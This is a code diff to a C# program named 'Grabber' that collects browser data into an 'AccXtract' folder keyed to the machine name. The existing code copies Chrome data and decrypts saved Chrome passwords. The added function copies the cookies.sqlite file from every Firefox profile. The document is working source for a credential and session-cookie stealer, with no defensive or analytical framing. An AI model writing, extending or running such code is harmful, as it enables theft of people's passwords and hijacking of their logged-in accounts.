@@ -35,13 +35,14 @@ namespace Grabber
 
             cd += "\\AccXtract\\" + Environment.MachineName;
 
-            grabChromeData(cd, home);
-            decryptChromePasswords(cd, home);
-            
+            bool chromeExists = grabChromeData(cd, home);
+            if (chromeExists) decryptChromePasswords(cd, home);
+
+            bool firefoxExists = grabFireFoxData(cd, home);
         }
 
 
-        static void grabChromeData(string cd, string home)
+        static bool grabChromeData(string cd, string home)
         {
             if (Directory.Exists(home + @"\AppData\Local\Google\Chrome"))
             {
@@ -105,7 +106,11 @@ namespace Grabber
                 }
 
                 file.Close();
+
+                return true;
             }
+
+            else return false;
         }
 
         static void decryptChromePasswords(string cd, string home)
@@ -151,6 +156,32 @@ namespace Grabber
                     conn.Close();
                 }
             }
+        }
+
+        static bool grabFireFoxData(string cd, string home)
+        {
+            string firefoxDirectory = home + @"\Appdata\Roaming\Mozilla\Firefox\Profiles";
+
+            if (Directory.Exists(firefoxDirectory))
+            {
+                string[] profiles = Directory.GetDirectories(firefoxDirectory);
+
+                foreach (string profile in profiles)
+                {
+                    string[] components = profile.Split('\\');
+                    string profileName = components[components.Length - 1].Split('.')[1];
+
+
+                    Directory.CreateDirectory(cd + "\\Firefox\\" + profileName);
+
+                    File.Copy(profile + "\\cookies.sqlite", cd + "\\Firefox\\" + profileName + "\\cookies.sqlite");
+                }
+
+
+                return true;
+            }
+
+            else return false;
         }
     }
 }
